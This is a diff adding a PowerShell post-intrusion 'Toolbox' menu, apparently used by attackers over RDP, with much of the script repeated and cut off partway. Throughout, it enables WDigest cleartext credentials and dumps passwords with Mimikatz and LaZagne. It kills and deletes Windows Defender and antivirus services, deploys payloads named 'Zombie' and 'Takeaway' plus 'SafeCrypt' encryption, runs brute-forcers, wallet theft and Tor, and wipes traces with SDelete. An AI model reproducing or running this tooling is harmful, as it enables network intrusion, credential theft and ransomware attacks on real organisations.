@@ -1,0 +1,633 @@
+param([Int32]$it=0)
+$menuDate = "27.01.2020"
+Add-Type -Name Window -Namespace Console -MemberDefinition '`
+[DllImport("Kernel32.dll")] `
+public static extern IntPtr GetConsoleWindow();`
+[DllImport("user32.dll")]`
+public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
+$consoleHWND = [Console.Window]::GetConsoleWindow();
+[Console.Window]::MoveWindow($consoleHWND,120,2,566,100) | Out-Null;
+$console = $host.UI.RawUI
+$console.WindowTitle = "Toolbox $menuDate"
+$buffer = $console.BufferSize
+$buffer.Width = 80
+$console.BufferSize = $buffer
+$size = $console.WindowSize
+$size.Width = 80
+$console.WindowSize = $size
+$size.Height = 34
+$console.ForegroundColor = "Yellow"
+$Global:tsclient = "\\tsclient\e"
+try {$Global:destination = $env:TEMP`
+[io.file]::OpenWrite("$destination\page.exe").close()}`
+Catch {try {$Global:destination = $env:Public`
+[io.file]::OpenWrite("$destination\page.exe").close()}`
+Catch {$Global:destination = "$env:SystemDrive\Temp"`
+New-Item -ItemType Directory -Force -Path $destination | Out-Null`
+[io.file]::OpenWrite("$destination\page.exe").close()}}
+Remove-Item "$destination\page.exe"
+cd $destination
+$isSystem = whoami | findstr /c:"system$" /c:"sistem$" 
+$tscliPath = Test-Path $tsclient -ea 0
+$luser = $env:USERNAME
+$Global:ProcessArchitecture = [IntPtr]::Size * 8
+$isDomain = (gwmi -Class Win32_ComputerSystem -EA 0).PartOfDomain
+$WGName =   (gwmi -Class Win32_ComputerSystem -EA 0).Workgroup
+$OSname =   (gwmi -class Win32_OperatingSystem).Caption
+function BlueLine {Write-Host "   $args" -f Blue -b White}
+function RedAlert {Write-Host "   $args" -f Red -b Yellow; sleep 5;return}
+cls
+if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))`
+{Write-Host user role is Administrator -f Red`
+$console.BackgroundColor = "DarkGreen"`
+$Global:isAdmin = 1`
+$regPath="HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\"`
+$key = "UseLogonCredential"`
+if(!(Get-ItemProperty -Path $regPath -Name $key -EA 0) -eq 1)`
+{New-ItemProperty -Path $regPath -Name $key -Type DWORD -Value 1 -EA 0}}
+elseif ($tscliPath) {$console.BackgroundColor = "DarkGray"`
+if ($it -eq 0) {try {Write-Host Trying to elevate...`
+start  $PsHome\powershell.exe "-NoProfile -ExecutionPolicy Bypass -File $tsclient\ps\toolbelt.ps1 -it 1" -Verb RunAs ; exit}`
+catch {Write-Host No previliges...}}}
+function MenuChoice {cls`
+$psVer = $host.Version.Major`
+if ($tscliPath) {$tbfile = Get-Item $tsclient\ps\toolbelt.ps1 -EA 0`
+if ($tbfile -and (($tbfile).LastWriteTime.ToUniversalTime() - ([DateTime]::ParseExact($menuDate, "d.M.yyyy", 'en-US' -as [Globalization.CultureInfo]))).TotalSeconds -lt 0) {Write-Host `nDisk E: outdated!}}`
+else {RedAlert "Disk E: not mapped! Use tools manually."}`
+function Infect{`
+$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+$appdir = $env:appdata+"\Oracle\Secure\"+$guid`
+$nappdir = $env:appdata+"\Microsoft\Windows\Windows Defender\"+$guid`
+BlueLine `n`nCopying Zombie ...`
+get-process tor -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process MsMpEng -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process javsecc -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+Remove-Item $appdir -ea 0 -Force -Recurse -Confirm:$false`
+$tor_dir = $env:appdata+'\'+$guid`
+Remove-Item $tor_dir -Recurse -ea 0 -Force -Confirm:$false`
+Remove-Item $nappdir -ea 0 -Force -Recurse -Confirm:$false`
+try {`
+$null = New-Item -ItemType Directory -Force -Path $appdir`
+cpi -Path $tsclient\torqNet\javsecc.exe -Destination $env:appdata`
+get-process javsecc -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+cd $env:appdata`
+explorer .`
+}`
+catch { ReadAlert `n`n`nCOPYING FAILED! Copy javsecc manually}`
+}`
+Write-Host "PS v.$psVer"`
+if ($isDomain) {write-host "`tDOMAIN   : "(gwmi Win32_ComputerSystem).Domain  -b Yellow -f Magenta`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -b Yellow -f Magenta`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -b Yellow -f Magenta} `
+elseif ($WGName) {write-host "`tWORKGROUP: $WGName" -f White`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -f White`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -f White}`
+else {write-host "`tНе удалось определить тип сети" -f White`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -f White`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -f White}`
+if ($isAdmin) {Write-Host "`tUser     : $luser`n`tRole     : Administrator. Have fun, bro!`t`n" -b Yellow -f Red;}`
+elseif ($isSystem) {Write-Host "`tUser     : $luser`n`tRole     : System. Better switch to admin`t`n" -b Yellow -f Red;}`
+else {Write-Host "`tUser     : $luser`n`tRole     : User (no privileges)`t`n" -b DarkGray -f White;}`
+$knownAVSvc = @()`
+$AVSvc = 'Dell PBA','Warsaw Technology','OfficeScan','Huorong','QQPCMgr','Client Agent','SentinelOne','Cybereason','Kingsoft Core','eScan','Acronis Ransomware','Huorong','QQPCMgr','CompLogic','Sybereason','VIPRE','Naver','AhnLab','G DATA','N-able','F-Secure','K7Real','Endpoint ','Safedog','Trend Micro','Avira', 'MBAB', 'Microsoft Anti', 'estsoft', 'netflow', 'Bitdefender', 'Norton', 'Kaspersky', 'ServiГ§o do Kaspersky', 'ESET', 'Panda', '360', 'AVG', 'webroot', 'Avast', 'Symantec', 'protection', 'antimalware', 'Windows Defender', 'McAfee','V3 ', 'Traps', 'Panda', 'Sophos'`
+foreach ($Svc in $AVSvc) {$cursvc = Get-Service -DisplayName ${Svc}*`
+if ($cursvc) {$knownAVSvc += $cursvc}}`
+$knownAVSvc | % {if ($_.Status -ne 'Running') {$fc = 'DarkGray'} else {$fc='White'}; Write-Host $_.Status $_.DisplayName`t -f $fc -b DarkRed}`
+$choice = Read-Host Menu`
+Switch($choice){0{BlueLine Starting Elevator; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\elevate.ps1`""  }`
+/{BlueLine Starting MS16; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ms16\ms16-135.ps1`""  }`
+1{BlueLine Starting User Changer; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\LApass.ps1`""  }`
+2{start lusrmgr.msc  }`
+3{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\lubrute.ps1`""  }`
+300{BlueLine Copying Lubru4...; cpi -Path "$tsclient\LBru4v4.zip" -Destination $destination -EA 0`
+$shell_app=new-object -com shell.application`
+$zip_file = $shell_app.namespace("$destination\LBru4v4.zip")`
+$dest = $shell_app.namespace($destination)`
+BlueLine Unpacking Lubru4...; $dest.Copyhere($zip_file.items(), 0x10)`
+BlueLine Starting Lubru4...; start cmd -ArgumentList "-c $destination\LBru4v4\Disp1.bat"}`
+4{New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ -Name UseLogonCredential -Type DWORD -Value 1  -EA 0`
+BlueLine Copying Mimikatz 1Mb...`
+if ($ProcessArchitecture -eq 64) {cpi -Path "$tsclient\mimikatz_trunk\x64\*.*" -Recurse -Destination $destination -EA 0}`
+else {cpi -Path "$tsclient\mimikatz_trunk\Win32\*.*" -Recurse -Destination $destination -EA 0}`
+cd $destination`
+BlueLine Starting Mimikatz ...`
+start  mimikatz.exe -ArgumentList ("log", "privilege::debug", "sekurlsa::logonpasswords", "exit") -Wait`
+$mimi = gc mimikatz.log `
+foreach ($string in $mimi) {$words = @(" Username "," Domain "," Password ")`
+if ($null -ne ($words | ? {$string -match $_ -and $string -notmatch "(null)"})) {$string -replace "^\s+\* ","" | Out-File logon.txt -Append}}`
+BlueLine Opening $toolName log...`
+ii logon.txt`
+gc logon.txt | clip`
+sleep 10`
+del mimikatz.exe`
+del mimidrv.sys`
+del mimilib.dll`
+del logon.txt}`
+5{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Find-Pass.ps1`" -NoExit" }`
+6{BlueLine Copying Password Viewers 1.6Mb...`
+cd "$destination\"`
+explorer .`
+cpi -Path "$tsclient\Password Viewers" -Destination $destination -Recurse}`
+7{$toolName = ''`
+BlueLine Copying RDP password viewer...`
+cpi -Path "$tsclient\rdpv\rdpv.exe" -Destination $destination`
+try {start "$destination\rdpv.exe"}catch{ReadAlert RDP password viewer FAILED to start}}`
+8{BlueLine Copying laZagne 6Mb...`
+cpi -Path "$tsclient\Lazagne\*.*" -Recurse -Destination $destination -EA 0`
+cd $destination`
+BlueLine Running laZagne ...`
+start lazagne.exe -ArgumentList "all>laZagneLog.txt " -Wait`
+BlueLine Opening laZagne log...`
+ii laZagneLog.txt`
+gc laZagneLog.txt | clip`
+sleep 10`
+del lazagne.exe`
+del laZagneLog.txt}`
+9 {BlueLine Copying Hash Dump...`
+cpi -Path "$tsclient\Hash_Suite_Free\Tools\Hashes_Dump_$ProcessArchitecture.exe" -Destination $destination`
+try {start  "$destination\Hashes_Dump_$ProcessArchitecture.exe";start "https://dropmefiles.com"}catch{ReadAlert Hash dump FAILED to start} }`
+10{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Delete-AVServices.ps1`""  }`
+101 {$dest=$env:TEMP;BlueLine Copying SafeMode;cpi -Path "$tsclient\1SafeMode\*.*" -Destination $dest`
+try {start  "$dest\AsAdmin.bat"}catch{ReadAlert SafeMode FAILED to start} }`
+102 {BlueLine Copying SafeCrypt;cpi -Path "$tsclient\SafeCrypt\*.*" -Destination $destination`
+try {start  "$destination\AsAdmin.bat"}catch{ReadAlert SafeCrypt FAILED to start} }`
+11{start appwiz.cpl   }`
+111{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\appWiz.ps1`"" }`
+12 {BlueLine Copying PCHunter ...`
+cpi -Path "$tsclient\PCHunter\PCHunter$ProcessArchitecture.exe" -Destination $destination`
+try {start  "$destination\PCHunter$ProcessArchitecture.exe"}catch{ReadAlert PCHunter FAILED to start} }`
+13{BlueLine Copying ProcessHacker 9Mb...`
+cpi -Path "$tsclient\exe\processhacker-2.39-setup.exe" -Destination $destination`
+try {start "$destination\processhacker-2.39-setup.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+14{BlueLine Copying Unlocker 2.5Mb...`
+cpi -Path "$tsclient\exe\unlocker-setup.exe" -Destination $destination`
+try {start "$destination\unlocker-setup.exe"}catch{ReadAlert Unlocker FAILED to start}}`
+15{BlueLine Copying gmer 0.3Mb...`
+cpi -Path "$tsclient\exe\gmer.exe" -Recurse -Destination "$destination\gamer.exe" -EA 0`
+cd $destination`
+start "gamer.exe"}`
+155{if (!(Test-Path "$destination\RegistryFinder$ProcessArchitecture.exe")) {BlueLine Copying RegistryFinder 2Mb...`
+cpi -Path "$tsclient\RegistryFinder\RegistryFinder$ProcessArchitecture.exe" -Recurse -Destination $destination -EA 0}`
+cd $destination`
+start  RegistryFinder$ProcessArchitecture.exe}`
+16{BlueLine Copying Revo Uninstaller 5Mb...`
+cpi -Path "$tsclient\exe\RevoUninstv401.exe" -Destination $destination`
+try {start "$destination\RevoUninstv401.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+17{BlueLine Copying IObit Uninstaller 4Mb...`
+cpi -Path "$tsclient\exe\iobituninstaller.exe" -Destination $destination`
+try {start "$destination\iobituninstaller.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+18{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Disable-WinDefend.ps1`""  }`
+20{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\purgeMemory.ps1`""  }`
+21{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe -ArgumentList "winhost"}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+22{Get-Process winhost | Stop-Process`
+start "$destination\winhost.exe"}`
+23{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\winhostok.ps1`""     }`
+222{if (!(Test-Path "$destination\javsect.exe")) {BlueLine Copying Zombie to $destination ...`
+cpi -Path $tsclient\torqNet\javsect.exe -Destination $destination -EA 0`
+if (!(Test-Path "$destination\javsect.exe")) {RedAlert FAILED to copy Zombie... Check AV! }}`
+try {BlueLine Locating Zombie...`
+cd $destination; explorer .}`
+catch {RedAlert Zombie FAILED to start. Check AV... }}`
+223{$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+explorer $env:temp\$guid`
+explorer $env:appdata\PostgreSQL\API\$guid}`
+224{$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+get-process tor, torque -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process PostgreSQLapi.exe -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+Get-item $env:temp\$guid\*.* | Remove-Item -ea 0 -Force -Confirm:$false`
+Get-item $env:appdata\PostgreSQL\API\$guid\*.* -ea 0 | Remove-Item -ea 0 -Force -Confirm:$false`
+Get-item "$destination\javsect.exe" -ea 0 | Remove-Item -ea 0 -Force -Confirm:$false}`
+25{ Infect }`
+26{BlueLine Copying SDelete 0.3Mb...`
+if ($ProcessArchitecture -eq 64) {cpi -Path "$tsclient\exe\SDelete\sdelete64.exe" -Destination $destination -EA 0}`
+else {cpi -Path "$tsclient\exe\SDelete\sdelete.exe" -Destination $destination -EA 0}`
+cpi -Path "$tsclient\exe\SDelete\sdelete.bat" -Destination $destination -EA 0`
+cd $destination`
+BlueLine Starting SDelete ...`
+start  sdelete.bat}`
+30{try {BlueLine Local Network Computer Listing:`
+start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetPC.ps1 $localPass"}`
+catch {RedAlert Network Listing FAILED to start...}}`
+31{start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetSubPC.ps1 $localPass"}`
+32{start mstsc.exe   }`
+33{if (!(Test-Path "$destination\NS2.exe")) {BlueLine Copying NS2...`
+try{cpi -Path $tsclient\exe\NS2.exe -Destination $destination -EA 0}catch{RedAlert FAILED to copy NS...}}`
+try{BlueLine Starting NS2...`
+start "$destination\NS2.exe"}catch{RedAlert NS2 FAILED to start...}}    `
+34 {BlueLine Copying Advanced IP Scanner 8Mb...`
+cpi -Path "$tsclient\AdvancedIPScanner\IPScan2.exe" -Destination $destination`
+try {start  "$destination\IPScan2.exe"}catch{ReadAlert Advanced IPScanner FAILED to start} }`
+40{BlueLine AD Computer Listing`
+start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetADPC.ps1 $localPass"}`
+401 {cpi -Path "$tsclient\WmiDomain\*.*" -Destination $destination`
+try {start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File $destination\GetHosts.ps1"}`
+catch{ReadAlert WmiDomain FAILED to start} }`
+41{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\adbrute.ps1`" -NoExit" }`
+42{cpi -Path $tsclient\2fin\2sys.ps1 -Destination $destination`
+cd $destination`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"2sys.ps1`" -NoExit", "$env:UserName, $localPass"}`
+43{try {start dsa.msc} catch {Write-Host `n`tAD Snap-in start Failed ... -f Red -b White; sleep 3}      }`
+44{try {start gpmc.msc} catch {Write-Host `n`tGPMC snap-in start Failed ... -f Red -b White; sleep 3}  }`
+50{cd $destination; explorer .   }`
+51{start taskmgr.exe  }`
+52{start  $PsHome\powershell.exe   }`
+53{start $env:ComSpec   }`
+54{Get-Process rdpclip | Stop-Process -Force -EA 0; start rdpclip.exe   }`
+55{start shutdown -ArgumentList "-r -t 0"      }`
+56{BlueLine Copying ClearLock...`
+cpi -Path "$tsclient\exe\ClearLock.exe" -Destination $destination`
+BlueLine Starting ClearLock`
+start "$destination\ClearLock.exe" -PassThru        }`
+57{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\wallet.ps1`" -NoExit" }`
+60{BlueLine Copying addSupport...`
+try{cpi -Path $tsclient\bat\addSupport.bat -Destination $destination -EA 0}`
+catch{RedAlert FAILED to copy addSupport...}`
+try{BlueLine Starting addSupport...`
+start "$destination\addSupport.bat"}catch{RedAlert addSupport FAILED to start...}`
+del "$destination\addSupport.bat"}`
+61{try {BlueLine Copying x${ProcessArchitecture}...;`
+cpi -Path $tsclient\2018\x${ProcessArchitecture}.exe $destination -EA 0`
+BlueLine Starting x${ProcessArchitecture}...;`
+start $destination\x${ProcessArchitecture}.exe -ArgumentList "powershell.exe"}catch{RedAlert Payload FAILED}}`
+99{start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\toolbelt1.ps1`""     }`
+88{Enable-PSRemoting`
+set-item wsman:localhost\client\trustedhosts -value *}`
+45 {$toolName = 'Mimi NL bot for Domain'`
+Write-Host $toolName is being copied now 1Mb... -f White`
+$appsrc = "$tsclient\mimiNLbrute\AD\javsec.exe"`
+if (!(Test-Path $appsrc)) {$appsrc = "$tsclient\miadnlrdp\nladbot.exe" }`
+try {cpi -Path $appsrc -Destination $destination -Force -EA 0`
+Write-Host Starting $toolName ... -f White`
+start $destination\javsec.exe } catch {RedAlert Copying of $toolName FAILED...}}`
+35 {$toolName = 'Mimi NL bot'`
+Write-Host $toolName is being copied now 1Mb... -f White`
+$appsrc = "$tsclient\mimiNLbrute\LAN\javsec.exe"`
+if (!(Test-Path $appsrc)) {$appsrc = "$tsclient\minlrdp\nlbot.exe" }`
+try {cpi -Path $appsrc -Destination $destination -Force -EA 0`
+Write-Host Starting $toolName ... -f White`
+start $destination\javsec.exe } catch {RedAlert Copying of $toolName FAILED...}}`
++{cd $tsclient`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Start-Tor.ps1`""}`
+.{cd $tsclient`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Email-Screenshot.ps1`" -NoNewWindow "`
+Get-Screenshot`
+$Subject = Read-Host Subject`
+Send-Mail -Subject $Subject`
+ri $ShotPath}`
+600{(get-process | ? {$_.mainwindowtitle -ne "" -and $_.processname -ne "powershell" } )| stop-process -Force`
+(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()} }`
+666{try {Add-Type -AssemblyName PresentationCore`
+$clip = [Windows.Clipboard]::GetText()`
+$clip | Out-File $destination\sample.ps1}`
+catch {RedAlert Failed to copy vicious code. Try 52, then right click...}`
+start  $PsHome\powershell.exe " -NoProfile -ExecutionPolicy Bypass -File $destination\sample.ps1" -Verb RunAs }`
+- {start -FilePath cmd.exe -ArgumentList "/c net user $env:USERNAME 2qaz!QAZ & pause"}`
+211{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\1\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+212{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\2\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+213{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\3\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+214{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\4\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+default {continue }}`
+MenuChoice}
+$console.WindowSize = $size
+MenuChoice
+param([Int32]$it=0)
+$menuDate = "27.01.2020"
+Add-Type -Name Window -Namespace Console -MemberDefinition '`
+[DllImport("Kernel32.dll")] `
+public static extern IntPtr GetConsoleWindow();`
+[DllImport("user32.dll")]`
+public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
+$consoleHWND = [Console.Window]::GetConsoleWindow();
+[Console.Window]::MoveWindow($consoleHWND,120,2,566,100) | Out-Null;
+$console = $host.UI.RawUI
+$console.WindowTitle = "Toolbox $menuDate"
+$buffer = $console.BufferSize
+$buffer.Width = 80
+$console.BufferSize = $buffer
+$size = $console.WindowSize
+$size.Width = 80
+$console.WindowSize = $size
+$size.Height = 34
+$console.ForegroundColor = "Yellow"
+$Global:tsclient = "\\tsclient\e"
+try {$Global:destination = $env:TEMP`
+[io.file]::OpenWrite("$destination\page.exe").close()}`
+Catch {try {$Global:destination = $env:Public`
+[io.file]::OpenWrite("$destination\page.exe").close()}`
+Catch {$Global:destination = "$env:SystemDrive\Temp"`
+New-Item -ItemType Directory -Force -Path $destination | Out-Null`
+[io.file]::OpenWrite("$destination\page.exe").close()}}
+Remove-Item "$destination\page.exe"
+cd $destination
+$isSystem = whoami | findstr /c:"system$" /c:"sistem$" 
+$tscliPath = Test-Path $tsclient -ea 0
+$luser = $env:USERNAME
+$Global:ProcessArchitecture = [IntPtr]::Size * 8
+$isDomain = (gwmi -Class Win32_ComputerSystem -EA 0).PartOfDomain
+$WGName =   (gwmi -Class Win32_ComputerSystem -EA 0).Workgroup
+$OSname =   (gwmi -class Win32_OperatingSystem).Caption
+function BlueLine {Write-Host "   $args" -f Blue -b White}
+function RedAlert {Write-Host "   $args" -f Red -b Yellow; sleep 5;return}
+cls
+if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))`
+{Write-Host user role is Administrator -f Red`
+$console.BackgroundColor = "DarkGreen"`
+$Global:isAdmin = 1`
+$regPath="HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\"`
+$key = "UseLogonCredential"`
+if(!(Get-ItemProperty -Path $regPath -Name $key -EA 0) -eq 1)`
+{New-ItemProperty -Path $regPath -Name $key -Type DWORD -Value 1 -EA 0}}
+elseif ($tscliPath) {$console.BackgroundColor = "DarkGray"`
+if ($it -eq 0) {try {Write-Host Trying to elevate...`
+start  $PsHome\powershell.exe "-NoProfile -ExecutionPolicy Bypass -File $tsclient\ps\toolbelt.ps1 -it 1" -Verb RunAs ; exit}`
+catch {Write-Host No previliges...}}}
+function MenuChoice {cls`
+$psVer = $host.Version.Major`
+if ($tscliPath) {$tbfile = Get-Item $tsclient\ps\toolbelt.ps1 -EA 0`
+if ($tbfile -and (($tbfile).LastWriteTime.ToUniversalTime() - ([DateTime]::ParseExact($menuDate, "d.M.yyyy", 'en-US' -as [Globalization.CultureInfo]))).TotalSeconds -lt 0) {Write-Host `nDisk E: outdated!}}`
+else {RedAlert "Disk E: not mapped! Use tools manually."}`
+function Infect{`
+$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+$appdir = $env:appdata+"\Oracle\Secure\"+$guid`
+$nappdir = $env:appdata+"\Microsoft\Windows\Windows Defender\"+$guid`
+BlueLine `n`nCopying Zombie ...`
+get-process tor -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process MsMpEng -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process javsecc -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+Remove-Item $appdir -ea 0 -Force -Recurse -Confirm:$false`
+$tor_dir = $env:appdata+'\'+$guid`
+Remove-Item $tor_dir -Recurse -ea 0 -Force -Confirm:$false`
+Remove-Item $nappdir -ea 0 -Force -Recurse -Confirm:$false`
+try {`
+$null = New-Item -ItemType Directory -Force -Path $appdir`
+cpi -Path $tsclient\torqNet\javsecc.exe -Destination $env:appdata`
+get-process javsecc -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+cd $env:appdata`
+explorer .`
+}`
+catch { ReadAlert `n`n`nCOPYING FAILED! Copy javsecc manually}`
+}`
+Write-Host "PS v.$psVer"`
+if ($isDomain) {write-host "`tDOMAIN   : "(gwmi Win32_ComputerSystem).Domain  -b Yellow -f Magenta`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -b Yellow -f Magenta`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -b Yellow -f Magenta} `
+elseif ($WGName) {write-host "`tWORKGROUP: $WGName" -f White`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -f White`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -f White}`
+else {write-host "`tНе удалось определить тип сети" -f White`
+write-host "`tMACHINE  : $env:COMPUTERNAME" -f White`
+write-host "`tPROCESSOR: x$ProcessArchitecture" -f White`
+write-host "`tOS       : $OSname" -f White}`
+if ($isAdmin) {Write-Host "`tUser     : $luser`n`tRole     : Administrator. Have fun, bro!`t`n" -b Yellow -f Red;}`
+elseif ($isSystem) {Write-Host "`tUser     : $luser`n`tRole     : System. Better switch to admin`t`n" -b Yellow -f Red;}`
+else {Write-Host "`tUser     : $luser`n`tRole     : User (no privileges)`t`n" -b DarkGray -f White;}`
+$knownAVSvc = @()`
+$AVSvc = 'Dell PBA','Warsaw Technology','OfficeScan','Huorong','QQPCMgr','Client Agent','SentinelOne','Cybereason','Kingsoft Core','eScan','Acronis Ransomware','Huorong','QQPCMgr','CompLogic','Sybereason','VIPRE','Naver','AhnLab','G DATA','N-able','F-Secure','K7Real','Endpoint ','Safedog','Trend Micro','Avira', 'MBAB', 'Microsoft Anti', 'estsoft', 'netflow', 'Bitdefender', 'Norton', 'Kaspersky', 'ServiГ§o do Kaspersky', 'ESET', 'Panda', '360', 'AVG', 'webroot', 'Avast', 'Symantec', 'protection', 'antimalware', 'Windows Defender', 'McAfee','V3 ', 'Traps', 'Panda', 'Sophos'`
+foreach ($Svc in $AVSvc) {$cursvc = Get-Service -DisplayName ${Svc}*`
+if ($cursvc) {$knownAVSvc += $cursvc}}`
+$knownAVSvc | % {if ($_.Status -ne 'Running') {$fc = 'DarkGray'} else {$fc='White'}; Write-Host $_.Status $_.DisplayName`t -f $fc -b DarkRed}`
+$choice = Read-Host Menu`
+Switch($choice){0{BlueLine Starting Elevator; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\elevate.ps1`""  }`
+/{BlueLine Starting MS16; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ms16\ms16-135.ps1`""  }`
+1{BlueLine Starting User Changer; start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\LApass.ps1`""  }`
+2{start lusrmgr.msc  }`
+3{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\lubrute.ps1`""  }`
+300{BlueLine Copying Lubru4...; cpi -Path "$tsclient\LBru4v4.zip" -Destination $destination -EA 0`
+$shell_app=new-object -com shell.application`
+$zip_file = $shell_app.namespace("$destination\LBru4v4.zip")`
+$dest = $shell_app.namespace($destination)`
+BlueLine Unpacking Lubru4...; $dest.Copyhere($zip_file.items(), 0x10)`
+BlueLine Starting Lubru4...; start cmd -ArgumentList "-c $destination\LBru4v4\Disp1.bat"}`
+4{New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ -Name UseLogonCredential -Type DWORD -Value 1  -EA 0`
+BlueLine Copying Mimikatz 1Mb...`
+if ($ProcessArchitecture -eq 64) {cpi -Path "$tsclient\mimikatz_trunk\x64\*.*" -Recurse -Destination $destination -EA 0}`
+else {cpi -Path "$tsclient\mimikatz_trunk\Win32\*.*" -Recurse -Destination $destination -EA 0}`
+cd $destination`
+BlueLine Starting Mimikatz ...`
+start  mimikatz.exe -ArgumentList ("log", "privilege::debug", "sekurlsa::logonpasswords", "exit") -Wait`
+$mimi = gc mimikatz.log `
+foreach ($string in $mimi) {$words = @(" Username "," Domain "," Password ")`
+if ($null -ne ($words | ? {$string -match $_ -and $string -notmatch "(null)"})) {$string -replace "^\s+\* ","" | Out-File logon.txt -Append}}`
